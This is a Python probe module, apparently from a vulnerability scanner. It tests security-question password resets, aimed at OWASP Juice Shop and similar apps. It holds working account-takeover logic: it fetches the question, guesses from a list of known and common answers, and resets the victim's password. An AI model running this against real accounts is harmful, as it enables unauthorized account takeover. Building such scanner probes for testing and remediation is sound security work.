"""Password reset via weak public-knowledge security answer.

Targets the Juice Shop reset flow but generalises to any application that
gates password reset behind a "security question" whose answer is public
knowledge or trivially guessable. Two failure modes:

1. The security-question endpoint discloses the question text for any
   email the attacker supplies.
2. The reset endpoint accepts a canonical answer (Bender's restaurant,
   Jim's middle name, "blue", "rex", etc.) and returns a 200 with a user
   payload, completing account takeover.

Probe is destructive in the sense that it changes a victim's password on
hit, hence the `destructive-low` tag. It only fires on a closed list of
canonical Juice Shop emails plus whatever the recon phase passes in via
`ctx.endpoint_hints`.
"""
from __future__ import annotations

from typing import Any
from urllib.parse import quote

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get, http_post_json

# Default targets: the well-known Juice Shop demo accounts whose answers
# are public knowledge from the project's documentation.
DEFAULT_EMAILS: tuple[str, ...] = (
    "bender@juice-sh.op",
    "jim@juice-sh.op",
    "bjoern@owasp.org",
)

# Question-fragment -> canonical answer. The probe matches the fragment
# (case-insensitive substring) against the question text and uses the
# matching answer on the reset POST. Generic answers cover targets where
# the question text is itself generic ("favorite color", "first pet").
CANONICAL_ANSWERS: tuple[tuple[str, str], ...] = (
    # Juice Shop bender@juice-sh.op: "Name of your favorite character ..."
    ("favorite character", "Stop'n'Drop am Wallueck"),
    # Bender prompt also references his eatery / restaurant in some builds.
    ("eatery", "Stop'n'Drop am Wallueck"),
    ("restaurant", "Stop'n'Drop am Wallueck"),
    # Jim's middle name is Samuel (Star Trek reference).
    ("middle name", "Samuel"),
    # Bjoern Kimminich's documented answer in the Juice Shop docs.
    ("company you first work", "Schranz"),
    ("first pet", "Bjoern"),
    # Generic public-knowledge answers seen across many SPAs.
    ("favorite color", "blue"),
    ("favorite colour", "blue"),
    ("name of your pet", "rex"),
    ("pet's name", "rex"),
    ("mother's maiden name", "Smith"),
    ("city where you were born", "London"),
)

# Endpoints to query for the security-question text.
QUESTION_PATHS: tuple[str, ...] = (
    "/rest/user/security-question",
    "/api/auth/security-question",
    "/api/users/security-question",
)

# Endpoints that consume the reset POST.
RESET_PATHS: tuple[str, ...] = (
    "/rest/user/reset-password",
    "/api/auth/reset-password",
)

# Canary password we set on hit. Long enough to satisfy any sane policy
# but obviously a probe artefact for cleanup later.
_NEW_PASSWORD = "Ptai-Reset-1234!"

# Success heuristics on the reset response body.
_SUCCESS_TOKENS: tuple[str, ...] = ("user", "success", "token", "authentication")


def _match_answer(question_text: str) -> str | None:
    """Return the canonical answer whose fragment matches the question, or None."""
    if not question_text:
        return None
    haystack = question_text.lower()
    for fragment, answer in CANONICAL_ANSWERS:
        if fragment.lower() in haystack:
            return answer
    return None


def _looks_like_success(status: int, body: str) -> bool:
    """Return True if the reset response indicates the password was changed."""
    if status != 200:
        return False
    if not body:
        return False
    lowered = body.lower()
    return any(token in lowered for token in _SUCCESS_TOKENS)


def _emit(target: str, email: str, question: str, answer: str) -> dict[str, Any]:
    return {
        "title": (
            f"Password reset bypass via weak security answer for {email}"
        ),
        "severity": "critical",
        "category": "authentication",
        "target": target,
        "evidence": (
            f"Question: {question!r}; canonical answer {answer!r} accepted "
            f"and password reset to a probe-controlled value."
        ),
        "bug_class": "auth_bypass",
        "remediation": (
            "Stop using static security questions for account recovery. "
            "Replace with email/SMS verification links bound to the original "
            "account. If kept, never expose the question to unauthenticated "
            "callers and rate-limit answer attempts per account."
        ),
    }


async def _fetch_question(
    ctx: ProbeContext, email: str
) -> tuple[str, str] | None:
    """Return (question_url, question_text) for the first endpoint that hits."""
    encoded = quote(email, safe="@")
    for path in QUESTION_PATHS:
        url = f"{ctx.base}{path}?email={encoded}"
        status, _, body = await http_get(ctx.session, url)
        if status == 200 and body:
            question = _extract_question_text(body)
            if question:
                return url, question
    return None


def _extract_question_text(body: str) -> str:
    """Pull the question text out of a JSON response, best-effort."""
    import json

    try:
        parsed = json.loads(body)
    except (ValueError, TypeError):
        return body  # treat raw body as the question if not JSON
    return _walk_for_string(parsed) or ""


def _walk_for_string(blob: Any) -> str | None:
    """Find the first plausible question string in a parsed response."""
    if isinstance(blob, str):
        return blob if "?" in blob or len(blob) > 8 else None
    if isinstance(blob, dict):
        # Common shapes: {"question": "..."}, {"data": {"question": "..."}}
        for key in ("question", "securityQuestion", "text", "prompt"):
            val = blob.get(key)
            if isinstance(val, str) and val:
                return val
        for value in blob.values():
            found = _walk_for_string(value)
            if found:
                return found
    elif isinstance(blob, list):
        for item in blob:
            found = _walk_for_string(item)
            if found:
                return found
    return None


async def _attempt_reset(
    ctx: ProbeContext, email: str, answer: str
) -> tuple[str, int, str] | None:
    """POST the reset to each candidate endpoint; return the first 200 hit."""
    payload = {
        "email": email,
        "answer": answer,
        "new": _NEW_PASSWORD,
        "repeat": _NEW_PASSWORD,
    }
    for path in RESET_PATHS:
        url = f"{ctx.base}{path}"
        status, _, body = await http_post_json(ctx.session, url, payload)
        if _looks_like_success(status, body):
            return url, status, body
    return None


@registry.probe(
    name="web.password_reset_weak",
    bug_class="auth_bypass",
    severity_max="critical",
    owasp="A07:2021",
    runtime_budget_s=10.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_password_reset_weak(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Test the security-question reset flow for each candidate email.

    Step 1: GET the security question for the email. Step 2: match the
    question text against canonical public answers. Step 3: POST a reset
    with that answer plus a probe-controlled new password. A 200 with a
    user/success token indicates account takeover.
    """
    emails = ctx.endpoint_hints or DEFAULT_EMAILS
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for email in emails:
        if email in seen:
            continue
        seen.add(email)

        question_hit = await _fetch_question(ctx, email)
        if question_hit is None:
            continue
        _question_url, question_text = question_hit

        answer = _match_answer(question_text)
        if answer is None:
            continue

        reset_hit = await _attempt_reset(ctx, email, answer)
        if reset_hit is None:
            continue
        reset_url, _status, _body = reset_hit
        findings.append(_emit(reset_url, email, question_text, answer))

    return findings
